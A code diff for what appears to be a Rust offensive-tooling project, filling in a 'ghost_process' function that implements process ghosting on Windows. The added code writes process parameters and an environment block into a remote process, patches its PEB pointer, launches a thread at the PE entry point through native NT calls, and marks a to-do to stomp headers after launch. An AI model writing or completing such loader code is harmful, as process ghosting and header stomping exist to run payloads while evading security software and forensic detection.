@@ -1,5 +1,6 @@
 use core::ffi::c_void;
 use core::ptr::null_mut;
+use std::bstr::ByteStr;
 
 use crate::debug;
 use crate::core::nt;
@@ -302,9 +303,9 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     debug!("[GHOST] Setting desktop info to: {:?}", INTERACTIVE_DESKTOP);
     win32::rtl_init_unicode_string(&mut desktop_info, INTERACTIVE_DESKTOP.as_ptr());
 
-    let mut process_params: *mut c_void = null_mut();
+    let mut process_parameters: *mut c_void = null_mut();
     let status = win32::rtl_create_process_parameters_ex(
-        &mut process_params,
+        &mut process_parameters,
         &mut image_path,
         null_mut(),             // DllPath
         null_mut(),             // CurrentDirectory
@@ -316,14 +317,14 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
         null_mut(),             // RuntimeData
         0,                      // UnicodeString.Buffer
     );
-    if status != STATUS_SUCCESS || process_params.is_null() {
+    if status != STATUS_SUCCESS || process_parameters.is_null() {
         debug!("[GHOST] RtlCreateProcessParametersEx failed: 0x{:08X}", status);
         state.rollback();
         return None;
     }
 
-    let params_length = (*(process_params as *const RtlUserProcessParameters)).maximum_length as usize;
-    let environment_size = get_environment_size((*(process_params as *const RtlUserProcessParameters)).environment);
+    let params_length = (*(process_parameters as *const RtlUserProcessParameters)).maximum_length as usize;
+    let environment_size = get_environment_size((*(process_parameters as *const RtlUserProcessParameters)).environment);
     let total_size = params_length + environment_size;
 
     let mut remote_params_base: *mut c_void = null_mut();
@@ -339,14 +340,137 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     );
 
     if status != STATUS_SUCCESS || remote_params_base.is_null() {
-        win32::rtl_destroy_process_parameters(process_params);
+        win32::rtl_destroy_process_parameters(process_parameters);
         state.rollback();
         return None;
     }
     state.params_remote = remote_params_base;
     state.params_size = remote_params_size;
 
-    unimplemented!()
+    // Write the params strucutre to the rmote allocation
+    let mut bytes_written: usize = 0;
+    debug!("[GHOST] Writing process parameters to remote process at {:p} ({} bytes)", remote_params_base, params_length);
+    let status = nt::nt_write_virtual_memory(
+        state.process_handle,
+        remote_params_base,
+        process_parameters as *const c_void,
+        params_length,
+        &mut bytes_written,
+    );
+
+    if status != STATUS_SUCCESS {
+        win32::rtl_destroy_process_parameters(process_parameters);
+        state.rollback();
+        return None;
+    }
+
+    // Copy the environment block into the remote allocation
+    let local_env = (*(process_parameters as *const RtlUserProcessParameters)).environment;
+    if !local_env.is_null() && environment_size > 0 {
+        let remote_evn_addr = (remote_params_base as usize + params_length) as *mut c_void;
+        let status = nt::nt_write_virtual_memory(
+            state.process_handle,
+            remote_evn_addr,
+            local_env as *const c_void,
+            environment_size,
+            &mut bytes_written,
+        );
+        if status != STATUS_SUCCESS {
+            win32::rtl_destroy_process_parameters(process_parameters);
+            state.rollback();
+            return None;
+        }
+
+        // Patch the environemt pointer inside remote params to the remote localtion
+        let env_field_offset = core::mem::offset_of!(RtlUserProcessParameters, environment);
+        let remote_env_field = (remote_params_base as usize + env_field_offset) as *mut c_void;
+        let status = nt::nt_write_virtual_memory(
+            state.process_handle,
+            remote_env_field,
+            &remote_evn_addr as *const _ as *const c_void,
+            core::mem::size_of::<*mut c_void>(),
+            &mut bytes_written
+        );
+        if status != STATUS_SUCCESS {
+            win32::rtl_destroy_process_parameters(process_parameters);
+            state.rollback();
+            return None;
+        }
+    }    
+
+
+    // Path  PEB.ProcessParameters to pint to our remote params
+    let peb_params_offset = core::mem::offset_of!(Peb64, process_parameters);
+    let peb_params_addr = (process_basic_information.peb_base_address as usize + peb_params_offset) as *mut c_void;
+
+    debug!("[GHOST] Writing remote process params to PEB at {:p}", peb_params_addr);
+    let status = nt::nt_write_virtual_memory(
+        state.process_handle,
+        peb_params_addr,
+        &remote_params_base as *const _ as *const c_void,
+        core::mem::size_of::<*mut c_void>(),
+        &mut bytes_written,
+    );
+
+    if status != STATUS_SUCCESS {
+        win32::rtl_destroy_process_parameters(process_parameters);
+        state.rollback();
+        return None;
+    }
+
+    debug!("[GHOST] Process parameters wirtten to remote process: {:p} ({} bytes)", remote_params_base, total_size);
+    win32::rtl_destroy_process_parameters(process_parameters);
+
+    // Create initial thread at the PE entry point
+    debug!("[GHOST] Creating thread at entry point: {:p}", entry_point);
+    let status = nt::nt_create_thread_ex(
+        &mut state.thread_handle,
+        0x00100003,       // SUSPEND_RESUME | TERMINATE | SYNCHRONIZE
+        null_mut(),       // ObjectAttributes
+        state.process_handle,
+        entry_point,      // StartRoutine = PE entry point
+        null_mut(),       // Argument
+        0x00000001,       // CREATE_SUSPENDED
+        0,                // ZeroBits
+        0,                // StackCommit
+        0,                // StackReserve
+        null_mut(),       // AttributeList
+    );
+
+    if status != STATUS_SUCCESS || state.thread_handle.is_null() {
+        debug!("[GHOST] NtCreateThreadEx failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+
+    // Resume the thread to start execution
+    let mut suspend_count: u32 = 0;
+    let status = nt::nt_resume_thread(state.thread_handle, &mut suspend_count);
+    debug!("[GHOST] NtResumeThread returned: 0x{:08X}, suspend_count={}", status, suspend_count);
+    if status != STATUS_SUCCESS || state.thread_handle.is_null() {
+        debug!("[GHOST] NtResumeThread failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+
+    let mut timeout: i64 = -300000000; 
+    debug!("[GHOST] Waiting for loader to finish (3s timeout)....");
+    let wait_result = nt::nt_wait_for_single_object(
+        state.thread_handle, 
+        0u8, 
+        &mut timeout as *mut _ as *mut c_void,
+    );
+    debug!("[GHOST] NtWaitForSingleObject reuslt: 0x{:08X}", wait_result);
+    if wait_result == 0x00000102u32 as i32 {
+        todo!("Process still alive after loader init, stomp the headers")
+    }
+
+    debug!("[GHOST] Process Handle: {:p}", state.process_handle);
+    debug!("[GHOST] Thread Handle:  {:p}", state.thread_handle);
+    debug!("[GHOST] Entry Point:    {:p}", entry_point);
+    debug!("[GHOST] PEB:            {:p}", process_basic_information.peb_base_address);
+
+    Some(state)  
 }
 
 unsafe fn generate_temp_path() -> [u16; 48] {
